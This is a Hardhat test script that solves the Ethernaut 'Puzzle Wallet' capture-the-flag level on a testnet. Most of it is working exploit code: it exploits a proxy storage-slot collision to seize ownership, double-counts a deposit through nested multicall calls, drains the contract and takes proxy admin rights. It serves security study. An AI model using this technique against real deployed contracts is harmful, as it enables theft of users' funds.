// npx hardhat test ./test/24_puzzle_wallet.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");
const { parseEther } = require("ethers/lib/utils");

let levelContract;
const INTERFACE_CONTRACT = "PuzzleProxy";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._24_puzzle_wallet, INTERFACE_CONTRACT, parseEther("1"));
});

it("solves the level", async function () {
    const accounts = await hre.ethers.getSigners();
    let puzzleWallet = await ethers.getContractAt(
        "PuzzleWallet",
        levelContract.address
    );
    console.log(`PuzzleWallet old owner`, await puzzleWallet.owner());
    await levelContract.proposeNewAdmin(accounts[0].address);
    console.log(`PuzzleWallet new owner`, await puzzleWallet.owner());

    // We can add our address to white list because we are the owner
    await puzzleWallet.addToWhitelist(accounts[0].address);

    // We can't yet use setMaxBalance to become admin of PuzzleProxy because puzzle wallet is not empty
    console.log(`Puzzle wallet balance 1 : `, await ethers.provider.getBalance(puzzleWallet.address));

    let calldataDeposit = puzzleWallet.interface.encodeFunctionData("deposit", []); // 0xd0e30db0
    let calldataMCDeposit = puzzleWallet.interface.encodeFunctionData("multicall", [[calldataDeposit]]);
    let calldataExecute = puzzleWallet.interface.encodeFunctionData("execute", [accounts[0].address, parseEther("2"), []]);

    //console.log(calldataDeposit);
    //console.log(calldataMCDeposit);
    //console.log(calldataExecute);

    let our3Functions = [
        calldataDeposit,
        calldataMCDeposit,
        calldataExecute];

    await puzzleWallet.multicall(our3Functions, { value: parseEther("1") });
    // If you were successful, the target contract should now have 0 balance and you should have an extra Ether in your wallet.
    console.log(`Puzzle wallet balance 2 : `, await ethers.provider.getBalance(puzzleWallet.address));

    await puzzleWallet.setMaxBalance(accounts[0].address);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});